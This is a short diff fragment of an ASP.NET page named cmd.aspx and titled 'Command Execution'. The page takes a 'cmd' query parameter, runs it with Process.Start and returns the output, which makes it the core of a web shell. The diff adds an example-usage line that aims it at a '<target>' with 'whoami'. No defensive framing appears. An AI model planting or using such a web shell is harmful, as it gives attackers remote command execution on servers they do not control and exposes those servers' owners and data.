@@ -7,7 +7,7 @@
         string cmd = Request.QueryString["cmd"];
         if (!string.IsNullOrEmpty(cmd))
         {
-     
+
 
             Process process = Process.Start(psi);
             StreamReader reader = process.StandardOutput;
@@ -29,3 +29,5 @@
     <h1>Command Execution</h1>
 </body>
 </html>
+
+# Example Usage:http://<target>/cmd.aspx?cmd=whoami
